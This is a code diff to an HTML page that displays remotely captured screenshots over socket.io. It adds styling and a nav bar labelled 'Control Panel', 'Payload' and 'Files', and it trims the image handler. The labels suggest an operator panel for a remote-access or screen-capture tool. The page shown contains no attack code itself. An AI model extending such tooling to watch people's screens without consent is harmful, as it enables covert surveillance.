@@ -3,10 +3,88 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/3.0.4/socket.io.js" integrity="sha512-aMGMvNYu8Ue4G+fHa359jcPb1u+ytAF+P2SCb+PxrjCdO3n3ZTxJ30zuH39rimUggmTwmh2u7wvQsDTHESnmfQ==" crossorigin="anonymous"></script>
     <title>Screen</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/3.0.4/socket.io.js" integrity="sha512-aMGMvNYu8Ue4G+fHa359jcPb1u+ytAF+P2SCb+PxrjCdO3n3ZTxJ30zuH39rimUggmTwmh2u7wvQsDTHESnmfQ==" crossorigin="anonymous"></script>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #1e1e1e;
+            color: #ccc;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        header {
+            width: 100%;
+            background-color: #333;
+            padding: 20px 0;
+        }
+        nav {
+            display: flex;
+            justify-content: center;
+        }
+        nav ul {
+            list-style-type: none;
+            margin: 0;
+            padding: 0;
+            display: flex;
+        }
+        nav li {
+            margin: 0 10px;
+        }
+        nav a {
+            color: #fff;
+            text-decoration: none;
+            padding: 10px 15px;
+            border-radius: 5px;
+            transition: background-color 0.3s;
+        }
+        nav a:hover {
+            background-color: #444;
+        }
+        .active {
+            background-color: #555;
+        }
+        h1 {
+            text-align: center;
+            padding: 20px;
+            width: 100%;
+            margin: 0;
+        }
+        button {
+            background-color: #444;
+            color: #fff;
+            border: none;
+            padding: 10px 20px;
+            margin: 10px 5px;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+        button:hover {
+            background-color: #555;
+        }
+        #capturedImage {
+            max-width: 90%;
+            margin: 20px 0;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+        }
+    </style>
 </head>
 <body>
+    <header>
+        <nav>
+            <ul>
+                <li><a href="/" class="active">Control Panel</a></li>
+                <li><a href="/payload">Payload</a></li>
+                <li><a href="/files">Files</a></li>
+            </ul>
+        </nav>
+    </header>
+
     <h1>Captured Image</h1>
     <button id="start">Start</button>
     <button id="stop">Stop</button>
@@ -16,9 +94,6 @@
         var socket = io();
         socket.connect(window.location.origin);
         const pageSID = window.location.pathname.split('/')[2];
-
-        let isLooping = false;
-        let loopInterval;
 
         const startButton = document.getElementById('start');
         const stopButton = document.getElementById('stop');
@@ -32,52 +107,15 @@
         });
 
         socket.on('screenshot', function(response) {
-            console.log("Received screenshot response:", response);
-
-            if (response["uid"] == pageSID) {
-                // Check if `response['image']` exists and is the expected type
-                if (response['image']) {
-                    console.log("Image data found in response:", response['image']);
-                    
-                    try {
-                        // Check if response['image'] has a `data` property or if it's an ArrayBuffer directly
-                        const imageData = response['image'].data || response['image'];
-
-                        console.log("Image data type:", typeof imageData);
-                        console.log("Image data length:", imageData.byteLength || imageData.length);
-
-                        // Convert binary data to a Blob
-                        const byteArray = new Uint8Array(imageData);
-                        const blob = new Blob([byteArray], { type: 'image/jpeg' });
-                        console.log("Blob created:", blob);
-
-                        // Create a URL for the Blob and set it as the image source
-                        const imageUrl = URL.createObjectURL(blob);
-                        document.getElementById('capturedImage').src = imageUrl;
-                        console.log("Image URL set to:", imageUrl);
-
-                        // Optionally, add a small delay before revoking to ensure the image loads
-                        setTimeout(() => URL.revokeObjectURL(imageUrl), 1000);  // 1-second delay
-
-                    } catch (error) {
-                        console.error("Error processing image data:", error);
-                    }
-                } else {
-                    console.warn("No image data found in response:", response);
-                }
-            } else {
-                console.log("Received response for different UID:", response["uid"]);
+            if (response["uid"] == pageSID && response['image']) {
+                const imageData = response['image'].data || response['image'];
+                const byteArray = new Uint8Array(imageData);
+                const blob = new Blob([byteArray], { type: 'image/jpeg' });
+                const imageUrl = URL.createObjectURL(blob);
+                document.getElementById('capturedImage').src = imageUrl;
+                setTimeout(() => URL.revokeObjectURL(imageUrl), 1000);
             }
         });
-
-
-
-
-        // Assume 'imageBase64' is the variable containing your Base64 string
-        const imageBase64 = 'data:image/png;base64,PUT_YOUR_BASE64_STRING_HERE';
-
-        // Set the src of the image element to the Base64 string
-        document.getElementById('capturedImage').src = imageBase64;
     </script>
 </body>
 </html>
